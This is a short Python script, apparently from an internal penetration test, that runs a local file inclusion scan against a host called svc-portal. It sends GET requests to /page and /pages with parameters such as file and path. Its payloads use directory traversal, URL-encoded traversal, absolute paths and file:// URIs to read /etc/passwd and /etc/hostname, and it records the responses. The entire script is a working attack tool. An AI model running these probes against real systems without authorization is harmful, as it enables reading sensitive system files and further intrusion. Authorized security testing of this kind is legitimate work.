# INT-r27-0021 LFI matrix-test: /page + /pages dual-face, param family x traversal shapes
# GET-only, no redirect following, interval >= 0.25s; dual-shape bookkeeping (../ vs absolute)
import http.client, json, time, urllib.parse

HOST, PORT = "svc-portal", 8007
endpoints = ["/page", "/pages"]
params = ["path", "file", "page", "doc"]
payloads = {
    "passwd-dotdot-raw": "../../../../etc/passwd",
    "passwd-dotdot-enc": "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "passwd-absolute": "/etc/passwd",
    "passwd-filescheme": "file:///etc/passwd",
    "hostname-dotdot-raw": "../../etc/hostname",
    "hostname-dotdot-enc": "..%2F..%2Fetc%2Fhostname",
    "hostname-absolute": "/etc/hostname",
    "hostname-filescheme": "file:///etc/hostname",
}
out = {"meta": {"intent": "INT-r27-0021", "kind": "lfi-matrix-dual-face", "ts_literal": "2026-10-23T16:00:00Z"}, "cases": []}

def get_raw(path):
    conn = http.client.HTTPConnection(HOST, PORT, timeout=6)
    raw_req = "GET %s HTTP/1.1\r\nHost: %s:%d\r\n\r\n" % (path, HOST, PORT)
    t0 = time.time()
    try:
        conn.request("GET", path)
        r = conn.getresponse()
        body = r.read(1200).decode("utf-8", "replace")
        res = {
            "raw_request": raw_req,
            "resp_status": r.status,
            "resp_headers": {k: v for k, v in r.getheaders()},
            "resp_body_excerpt": body[:400],
            "body_full_len": len(body),
            "elapsed_ms": int((time.time() - t0) * 1000),
        }
    except Exception as e:
        res = {"raw_request": raw_req, "error": repr(e)[:160]}
    finally:
        conn.close()
    return res

# control pairs: bare endpoints + empty-param baselines on both faces
for ep in endpoints:
    out["cases"].append({"case": "baseline", "endpoint": ep, "param": None, "payload": None, "path": ep, **get_raw(ep)})
    time.sleep(0.3)
    for p in params:
        q = "%s?%s=" % (ep, p)
        out["cases"].append({"case": "empty-param-baseline", "endpoint": ep, "param": p, "payload": None, "path": q, **get_raw(q)})
        time.sleep(0.3)

# payload matrix: enc payloads sent as-is (already encoded), raw payloads sent verbatim
for ep in endpoints:
    for pname, pval in payloads.items():
        for p in params:
            q = "%s?%s=%s" % (ep, p, pval)
            out["cases"].append({"case": "payload", "endpoint": ep, "param": p, "payload": pname, "payload_raw": pval, "path": q, **get_raw(q)})
            time.sleep(0.3)

print(json.dumps(out, ensure_ascii=False, indent=1))
